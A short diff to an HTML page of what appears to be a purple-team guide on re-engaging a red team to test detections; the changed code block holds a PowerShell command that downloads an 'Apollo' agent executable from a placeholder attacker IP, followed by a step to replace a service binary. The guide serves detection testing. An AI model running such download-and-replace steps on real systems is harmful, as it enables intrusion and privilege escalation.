@@ -14,7 +14,6 @@ permalink: /solo-purple-teaming/red-team-re-engage-for-level-testing-all-detecti
 <section class="spt-content">
 <h1 id="red-team-re-engage-for-level---testing-all-detections">Red Team
 Re-Engage For Level - Testing All Detections</h1>
-<p>Owner: Mike Sterrett</p>
 <h3 id="1-purpose-of-reengagement"><strong>1. Purpose of
 Reengagement</strong></h3>
 <ul>
@@ -83,7 +82,7 @@ over service.</li>
 <ul>
 <li><p>Pull <strong>Apollo agent</strong> using PowerShell:</p>
 <div class="sourceCode" id="cb1"><pre
-class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Invoke-WebRequest</span> <span class="op">-</span>Uri http<span class="op">://&lt;</span>attacker_ip<span class="op">&gt;:</span><span class="dv">8000</span><span class="op">/</span>apollo<span class="op">.</span><span class="fu">exe</span> <span class="op">-</span>OutFile Downloads\apollo<span class="op">.</span><span class="fu">exe</span></span></code></pre></div></li>
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">Invoke-WebRequest</span> <span class="op">-</span>Uri http<span class="op">://<</span>attacker_ip<span class="op">>:</span><span class="dv">8000</span><span class="op">/</span>apollo<span class="op">.</span><span class="fu">exe</span> <span class="op">-</span>OutFile Downloads\apollo<span class="op">.</span><span class="fu">exe</span></span></code></pre></div></li>
 <li><p>Verify file in <code>Downloads</code>.</p></li>
 </ul></li>
 <li><strong>Replace service binary</strong>:
